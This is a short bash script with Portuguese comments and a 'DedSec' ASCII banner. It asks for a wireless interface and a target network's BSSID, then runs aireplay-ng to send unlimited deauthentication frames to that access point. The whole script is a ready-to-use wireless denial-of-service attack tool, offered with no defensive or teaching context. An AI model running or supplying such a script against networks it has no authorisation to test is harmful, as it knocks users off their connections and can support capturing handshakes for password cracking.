#!/bin/bash

# Exibe o banner
echo "  _____           _  _____           "
echo " |  __ \         | |/ ____|          "
echo " | |  | | ___  __| | (___   ___  ___ "
echo " | |  | |/ _ \/ _' |\___ \ / _ \/ __|"
echo " | |__| |  __/ (_| |____) |  __/ (__ "
echo " |_____/ \___|\__,_|_____/ \___|\___|"
echo "                                     "
echo "                                     "

# Solicita a entrada do usuário para a interface de rede e o BSSID
read -p "Digite a interface de rede (exemplo: wlan0, wlan1): " iface
read -p "Digite o BSSID da rede alvo (exemplo: 00:11:22:33:44:55): " bssid

# Verifica se a interface e o BSSID foram fornecidos
if [ -z "$iface" ] || [ -z "$bssid" ]; then
    echo "Interface ou BSSID não inserido! Saindo..."
    exit 1
fi

# Executa o comando aireplay-ng para realizar o ataque de desautenticação
sudo aireplay-ng --deauth 0 -a "$bssid" "$iface"
